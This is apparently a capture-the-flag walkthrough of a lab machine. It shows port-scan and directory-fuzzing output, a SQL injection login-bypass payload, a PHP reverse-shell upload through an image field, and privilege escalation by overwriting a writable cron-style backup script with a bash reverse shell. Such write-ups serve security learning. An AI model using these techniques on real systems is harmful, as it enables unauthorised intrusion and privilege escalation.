### Open ports
```bash
rustscan -a 10.10.187.84 -- -A 

Open 10.10.187.84:22
Open 10.10.187.84:80
Open 10.10.187.84:445

PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSk+lD9baengtZg1zPPR4SVHS2JWnI2fkH90VgBhh7iRQKND35/SOP13L/a3oDA3qub2FgT1ejvHA3D7wcY5ZCgq17mLXCw6WW0IDRWbH7kyPUBolc9h6ZI+Zpiyr7sUitywYRW5WCrEHpUs6ol92pR46UnXfwmsuvY6RVWaviUT95xmUZPgVUpw8PJjDU3TJpCYEtnW6AoEO0/7OSx7LkbrvMCnIitZi2mcBvfc/WbCmvtiOLsKBwh21VCXUhLAzVGZ5xOdD4rAcD3OACM/gJVGe5wJJJL1Abt/1flGBJyvYZUoz/JQxoa+HpjcRXmSa+nprBxPdvmQDjsf+UPmpegVPME9iNfkmoEWDgN/lWWZnyPC8kBzhxkM8/rQkfmJlK1F9Lq60BoF6ipj6/W1O94yzaFL7+mNRFrV86zgZhbr1l9MQyUcJoDnlCMygYo1HhkYsfGBR1Tu5M031sZpVNIEUSSfXwrlUX4k4ThaCPDsEMB941K/OUbAuhmQo2MGE=
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMLlGKfQy13XGzOkqSgnrB7thrs/Bh+kpzchoHn6PCCBDOZ0j3uFzQWvl5uimdLDXombozAcFHlzDjGL50hKarQ=
|   256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHs4NezobK71HOHpkwVK5b5LS0MgCghx1Oj4eld8ONa1
80/tcp  open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
```

### Directory Bruteforcing 
```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt -u http://10.10.187.84/FUZZ -t 100                                       ─╯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.187.84/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 613ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 613ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1140ms]
admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 280ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 275ms]
passwd                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 320ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 316ms]
shadow                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 358ms]
:: Progress: [4737/4737] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```
```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt -u http://10.10.187.84:445/FUZZ -t 100                                   ─╯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.187.84:445/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 509ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1360ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5578ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 243ms]
management              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 282ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 276ms]
:: Progress: [4737/4737] :: Job [1/1] :: 348 req/sec :: Duration: [0:00:15] :: Errors: 0 ::

```

In URL http://10.10.187.84:445/management I found the following website.
![[ploted1.png]]

It reveals a name and a mail address.
![[ploted2.png]]
name: Tommy Lasorda
Developer mail: oretnom23@mail.com

```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt -u http://10.10.187.84:445/management/FUZZ -t 100                        ─╯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.187.84:445/management/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 425ms]
admin                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 245ms]
assets                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 283ms]
build                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 241ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 7120ms]
classes                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 324ms]
database                [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 397ms]
dist                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 280ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 406ms]
inc                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 242ms]
libs                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 504ms]
pages                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 279ms]
plugins                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 555ms]
index.php               [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 6515ms]
uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 318ms]
:: Progress: [4737/4737] :: Job [1/1] :: 305 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

I bypass the login using the following payload:  `username:admin' or '1'='1'#&password:''`
Launched the dashboard
![[ploted4.png]]
The I went to drivers list
![[ploted5.png]]
From Action button I choose to Edit
![[ploted6.png]]
Then in photo section I have uploaded a php reverse shell. 
and found the shell in the following link.
http://10.10.89.33:445/management/uploads/drivers/
![[ploted7.png]]
Clicking that shell I have received the reverse shell on the listening port.
![[ploted8.png]]
Then I upgrade it to tty shell.

Inside `/var/www/scripts/` a backup.sh file was found which was executed by user plot_admin. I had write privilege in that directory. So I remove that `backup.sh` and create a new one with a bash reverse shell. 
![[ploted9.png]]
![[ploted10.png]]
And opening a listener obtain the shell
![[ploted11.png]]
